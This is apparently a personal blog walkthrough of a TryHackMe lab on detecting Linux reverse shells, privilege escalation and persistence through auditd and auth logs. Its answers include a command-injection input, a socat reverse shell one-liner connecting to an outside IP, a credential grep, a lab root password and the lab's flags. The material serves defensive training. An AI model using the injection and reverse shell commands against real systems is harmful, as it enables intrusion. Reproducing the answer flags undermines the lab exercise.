---
title: Linux Threat Detection 3 Walkthrough
description: Investigate reverse shells, privilege escalation, and persistence techniques on Linux hosts.
pubDate: 2026-11-03
categories:
  - SOC
  - Walkthrough
  - TryHackMe
  - Network
tags:
  - Lessons
image: /image/networksecess.png
---
---
## Summary

In this final room of the Linux Security Monitoring module, I investigated reverse shells, privilege escalation, and common Linux persistence mechanisms using `auditd` and authentication logs. First, I tested OS command injection in the `TryPingMe` web application (`127.0.0.1 && whoami` and a `socat` reverse shell) and analyzed `/home/ubuntu/scenario/audit.log` to find the IP that opened a `socat` reverse shell (`10.14.105.255`). Next, I traced how the attacker searched for credentials (`grep -iR pass .`), read `/opt/trypingme/.env.local` to obtain the root password (`nGql1pQkGa`), and escalated privileges via `su root`. Finally, I hunted down four persistence mechanisms on the host: a malicious systemd service (`/etc/systemd/system/tux.service` executing `/var/lib/misc/tux`), a root `@reboot` cron job (`/var/spool/cron/crontabs/root` executing `/usr/sbin/phoenix`), a backdoor sudo user (`koichi`), and an SSH key added to `/root/.ssh/authorized_keys`.

---

**Learning Objectives**

- Learn how reverse shells are used in Linux intrusions
- Understand how attackers escalate their privileges
- Explore the five most common techniques to persist on Linux
- Uncover the learned techniques through system logs

---
## Task 1.1
Run `127.0.0.1 && whoami` in the TryPingMe web app. What output do you see after the ping results?

**Answer**: `svctrypingme`

**Why?**
Entering `127.0.0.1 && whoami` into the `TryPingMe` web application executes `ping` followed by `whoami` on the server, printing the service account username `svctrypingme` at the bottom of the ping output.

![](../../assets/Pasted%20image%2020261110165801.png)

## Task 1.2
Now try to run a socat reverse shell in the TryPingMe web app. What is the flag returned in the response?

**Answer**: `THM{revshells_practitioner!}`

**Why?**
Injecting the `socat` reverse shell command (`127.0.0.1 && socat TCP:10.14.105.255:1337 EXEC:sh,pty,stderr,setsid,sigint,sane`) into the `TryPingMe` input field simulates a reverse shell callback and returns the flag `THM{revshells_practitioner!}`.

![](../../assets/Pasted%20image%2020261110165858.png)

## Task 1.3
Now look at the exported auditd logs at `/home/ubuntu/scenario`. Which IP spawned a similar reverse shell via the TryPingMe app?

**Answer**: `10.14.105.255`

**Why?**
Querying `/home/ubuntu/scenario/audit.log` with `ausearch -i -if audit.log | grep -iE "sh"` shows the command injection `/bin/sh -c ping -c 4 -W 1 10.14.105.255 && socat TCP:10.14.105.255:1337 EXEC:sh,pty,stderr,setsid,sigint,sane`, connecting back to `10.14.105.255`.

![](../../assets/Pasted%20image%2020261110170142.png)
![](../../assets/Pasted%20image%2020261110170121.png)

## Task 2.1
Which command line was used to look for the "pass" keyword in files?

**Answer**: `grep -iR pass .`

**Why?**
Listing the `proctitle` entries in `/home/ubuntu/scenario/audit.log` (`ausearch -i -if audit.log | grep -iE "proc"`) shows the attacker running `find` and `grep` inside the web app directory after spawning the `socat` shell, specifically executing `proctitle=grep -iR pass .`.

![](../../assets/Pasted%20image%2020261110170700.png)

## Task 2.2
Which command line was used to escalate privileges to root?

**Answer**: `su root`

**Why?**
Looking at the next two commands in `audit.log` right after `grep -iR pass .`, the attacker reads `.env.local` (`proctitle=cat .env.local`) and then switches to the `root` account using `proctitle=su root`.

![](../../assets/Pasted%20image%2020261110170757.png)

## Task 2.3
Looking at the detected `.env` file, what was the root password?

**Answer**: `nGql1pQkGa`

**Why?**
Checking the `CWD` record for the `cat .env.local` event (`14:53:44`) shows `cwd=/opt/trypingme`. Navigating to `/opt/trypingme` and running `cat .env.local` reveals `# USER=root` and `# PASSWORD=nGql1pQkGa`.

![](../../assets/Pasted%20image%2020261110173048.png)

![](../../assets/Pasted%20image%2020261110173203.png)

## Task 3.1
What flag did you get after running the malware persisting as a service?

**Answer**: `THM{hidden_penguin!}`

**Why?**
Searching `auditd` for systemd service files with `ausearch -i -f /etc/systemd/ | grep -iE "service"` reveals `nano /etc/systemd/system/tux.service`. Reading `/etc/systemd/system/tux.service` shows `ExecStart=/var/lib/misc/tux`. Running `/var/lib/misc/tux` and entering `/etc/systemd/system/tux.service` outputs the flag `THM{hidden_penguin!}`.

![](../../assets/Pasted%20image%2020261110175648.png)

![](../../assets/Pasted%20image%2020261110175755.png)

## Task 3.2
What flag did you get after running the malware persisting as a cron job?

**Answer**: `THM{ressurect_on_reboot!}`

**Why?**
Searching `auditd` for cron activity with `ausearch -i -x cron` shows `proctitle=crontab -e` creating a crontab inside `cwd=/var/spool/cron` (`crontabs/`). Checking for a similar `@reboot` line like the APT29 example in `/var/spool/cron/crontabs/root` (`cat root`) reveals `@reboot /usr/sbin/phoenix`. Running `/usr/sbin/phoenix` and providing `/var/spool/cron/crontabs/root` returns the flag `THM{ressurect_on_reboot!}`.

![](../../assets/Pasted%20image%2020261110180027.png)

![](../../assets/Pasted%20image%2020261110180222.png)

![](../../assets/Pasted%20image%2020261110180156.png)

![](../../assets/Pasted%20image%2020261110180351.png)

![](../../assets/Pasted%20image%2020261110180502.png)

![](../../assets/Pasted%20image%2020261110180616.png)

## Task 4.1
Which user was created and added to the sudo group?

**Answer**: `koichi`

**Why?**
Filtering `/var/log/auth.log` for `sudo` events with `cat auth.log | grep -iE "sudo"` shows `usermod[1331]: add 'koichi' to group 'sudo'` and `add 'koichi' to shadow group 'sudo'`.

![](../../assets/Pasted%20image%2020261110195415.png)

## Task 4.2
Which file was changed to allow SSH key persistence?

**Answer**: `/root/.ssh/authorized_keys`

**Why?**
Searching `auditd` for modifications to `authorized_keys` using `ausearch -i -f /.ssh/authorized_keys` reveals `proctitle=bash` opening `name=/root/.ssh/authorized_keys` with `O_WRONLY|O_CREAT|O_APPEND` to append an SSH key for root access.

![](../../assets/Pasted%20image%2020261110195524.png)

![](../../assets/Pasted%20image%2020261110200059.png)

## Task 5.1
Does Linux ransomware exist and impact organizations worldwide? (Yea/Nay)

**Answer**: `Yea`

**Why?**
As shown in the **Linux in Ransomware** section, Linux ransomware is on the rise, frequently targeting Linux hypervisors (such as ESXi or KVM) to encrypt all hosted virtual machines at once.

![](../../assets/Pasted%20image%2020261110200234.png)
